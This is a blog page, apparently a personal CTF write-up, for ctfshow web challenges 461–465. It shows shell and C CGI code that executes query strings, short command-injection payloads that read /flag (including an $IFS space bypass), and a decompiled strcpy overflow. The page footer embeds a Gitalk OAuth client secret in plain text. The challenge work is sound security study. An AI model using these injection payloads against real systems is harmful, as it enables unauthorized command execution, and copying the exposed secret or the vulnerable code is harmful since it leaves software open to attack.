@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]嵌入式 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web461
+#!/bin/bash
+  OIFS=&quot;$IFS&quot;
+  IFS=&quot;,&quot;
+  set $QUERY_STRING
+  Args=($QUERY_STRING)
+  IFS=&quot;$O..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]嵌入式</h2>
+            <div class="post-date">2024-07-12</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowqian-ru-shi.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web461">web461</h2>
+<pre><code class="language-sh">#!/bin/bash
+  OIFS=&quot;$IFS&quot;
+  IFS=&quot;,&quot;
+  set $QUERY_STRING
+  Args=($QUERY_STRING)
+  IFS=&quot;$OIFS&quot;
+  if [ &quot;${Args[2]}&quot;ctf = &quot;admin&quot;ctf ]; then
+          echo &quot;`${Args[0]}$IFS${Args[1]}`&quot;
+  fi
+exit 0
+</code></pre>
+<p>代码中将IFS修改为<code>,</code>，我们传入参数时使用<code>,</code>分割。</p>
+<pre><code>?cat,/flag,admin
+</code></pre>
+<h2 id="web462">web462</h2>
+<pre><code class="language-sh">#!/bin/bash
+ OIFS=&quot;$IFS&quot;
+  IFS=&quot;,&quot;
+  set $QUERY_STRING
+  Args=($QUERY_STRING)
+  IFS=&quot;$OIFS&quot;
+  if [ &quot;${Args[0]}&quot;ctf = &quot;ping&quot;ctf ]; then
+          addr=&quot;`echo ${Args[1]} | sed 's|[\]||g' | sed 's|%20| |g'`&quot;
+          addr=&quot;ping -c 1 &quot;$addr
+          $addr
+  fi
+</code></pre>
+<p>不是很懂shell的解析方式。</p>
+<p>想通过注入方式加入命令，但是不行。。。</p>
+<pre><code>?ping,8.8.8.8&amp;&amp;ls
+</code></pre>
+<h2 id="web463">web463</h2>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &quot;fcgi_stdio.h&quot;
+#include &lt;cstring&gt;
+
+
+/* just get lastest info */
+int _System(const char * cmd, char *pRetMsg, int msg_len)
+{
+	FILE * fp;
+	char * p = NULL;
+	int res = -1;
+	if (cmd == NULL || pRetMsg == NULL || msg_len &lt; 0)
+	{
+		printf(&quot;Param Error!\n&quot;);
+		return -1;
+	}
+	if ((fp = popen(cmd, &quot;r&quot;) ) == NULL)
+	{
+		printf(&quot;Popen Error!\n&quot;);
+		return -2;
+	}
+	else
+	{
+		memset(pRetMsg, 0, msg_len);
+		//get lastest result
+		while(fgets(pRetMsg, msg_len, fp) != NULL)
+		{
+			printf(&quot;Msg:%s&quot;,pRetMsg); //print all info
+		}
+
+		if ( (res = pclose(fp)) == -1)
+		{
+			printf(&quot;close popenerror!\n&quot;);
+			return -3;
+		}
+		pRetMsg[strlen(pRetMsg)-1] = '\0';
+		return 0;
+	}
+}
+
+int main(void)
+{
+    int count = 0;
+    char *cmd = &quot;&quot;;
+    char a8Result[128] = {0};
+    int ret = 0;
+    while (FCGI_Accept() &gt;= 0)
+        printf(&quot;Content-type: text/html\r\n&quot;
+        &quot;\r\n&quot;
+        &quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;
+        &quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;
+        );
+        cmd=getenv(&quot;QUERY_STRING&quot;);
+	ret  = _System(cmd, a8Result, sizeof(a8Result));
+        printf(&quot;ret = %d \nresult = %s\nlength = %d \n&quot;, ret, a8Result, strlen(a8Result));
+    return 0;
+}
+
+</code></pre>
+<p>直接执行命令，不过需要使用$IFS代替空格</p>
+<pre><code>?cat$IFS/flag
+</code></pre>
+<h2 id="web464">web464</h2>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &quot;fcgi_stdio.h&quot;
+#include &lt;cstring&gt;
+
+
+/* just get lastest info */
+int _System(const char * cmd, char *pRetMsg, int msg_len)
+{
+	FILE * fp;
+	char * p = NULL;
+	int res = -1;
+	if (cmd == NULL || pRetMsg == NULL || msg_len &lt; 0)
+	{
+		printf(&quot;Param Error!\n&quot;);
+		return -1;
+	}
+	if ((fp = popen(cmd, &quot;r&quot;) ) == NULL)
+	{
+		printf(&quot;Popen Error!\n&quot;);
+		return -2;
+	}
+	else
+	{
+		memset(pRetMsg, 0, msg_len);
+		//get lastest result
+		while(fgets(pRetMsg, msg_len, fp) != NULL)
+		{
+			printf(&quot;Msg:%s&quot;,pRetMsg); //print all info
+		}
+
+		if ( (res = pclose(fp)) == -1)
+		{
+			printf(&quot;close popenerror!\n&quot;);
+			return -3;
+		}
+		pRetMsg[strlen(pRetMsg)-1] = '\0';
+		return 0;
+	}
+}
+
+int main(void)
+{
+    int count = 0;
+    char *cmd = &quot;&quot;;
+    char a8Result[128] = {0};
+    int ret = 0;
+    while (FCGI_Accept() &gt;= 0)
+        printf(&quot;Content-type: text/html\r\n&quot;
+        &quot;\r\n&quot;
+        &quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;
+        &quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;
+        );
+        cmd=getenv(&quot;QUERY_STRING&quot;);
+	ret  = _System(cmd, a8Result, sizeof(a8Result));
+    return 0;
+}
+</code></pre>
+<p>同上题</p>
+<pre><code>/?cat$IFS/flag
+</code></pre>
+<h2 id="web465">web465</h2>
+<p>提供了cgi<br>
+逆向后查看main函数</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char dest[32]; // [rsp+0h] [rbp-30h] BYREF
+  char *src; // [rsp+20h] [rbp-10h]
+  int v6; // [rsp+2Ch] [rbp-4h]
+
+  v6 = 0;
+  while ( (int)FCGI_Accept(*(_QWORD *)&amp;argc, argv, envp) &gt;= 0 )
+  {
+    *(_QWORD *)&amp;argc = &quot;Content-type: text/html\r\n\r\n&lt;title&gt;CTFshow&lt;/title&gt;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;;
+    FCGI_printf(&quot;Content-type: text/html\r\n\r\n&lt;title&gt;CTFshow&lt;/title&gt;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;);
+  }
+  src = getenv(&quot;QUERY_STRING&quot;);
+  strcpy(dest, src);
+  return 0;
+</code></pre>
+<p>大概是通过strcpy处的栈溢出调用getflag,间接调用_system执行命令。</p>
+<p>不太清楚程序载入地址，以及需要通过ROP设置参数，有点复杂，暂时不会。。。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowqi-ta/">
+                  <h3 class="post-title">
+                    [ctfshow]其他
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
